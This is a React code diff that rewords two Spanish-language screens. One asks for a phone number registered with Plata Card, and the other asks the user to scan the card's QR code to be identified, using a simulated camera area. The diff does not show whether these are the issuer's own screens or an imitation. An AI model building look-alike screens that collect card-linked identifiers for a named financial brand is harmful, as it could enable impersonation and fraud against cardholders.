@@ -367,14 +367,14 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   <div className="bg-gradient-to-r from-orange-500 to-orange-600 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
                     <span className="text-2xl text-white">📱</span>
                   </div>
-                  <h2 className="text-2xl font-bold text-gray-900 mb-2">Ingresa tu teléfono</h2>
-                  <p className="text-gray-600">Para contactarte sobre tu entrega</p>
+                  <h2 className="text-2xl font-bold text-gray-900 mb-2">Ingresa tu número celular</h2>
+                  <p className="text-gray-600">registrado con Plata Card</p>
                 </div>
 
                 {/* Input de teléfono */}
                 <div className="mb-6">
                   <label className="block text-sm font-medium text-gray-700 mb-2">
-                    Número de teléfono celular
+                    Número celular registrado con Plata Card
                   </label>
                   <input
                     type="tel"
@@ -415,8 +415,8 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   <div className="bg-gradient-to-r from-orange-500 to-orange-600 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
                     <span className="text-2xl text-white">📷</span>
                   </div>
-                  <h2 className="text-2xl font-bold text-gray-900 mb-2">Escanea tu tarjeta</h2>
-                  <p className="text-gray-600">Código QR de tu Plata Card</p>
+                  <h2 className="text-2xl font-bold text-gray-900 mb-2">Escanea el código QR</h2>
+                  <p className="text-gray-600">de tu Plata Card para poder identificarte</p>
                 </div>
 
                 {/* Área de cámara simulada */}
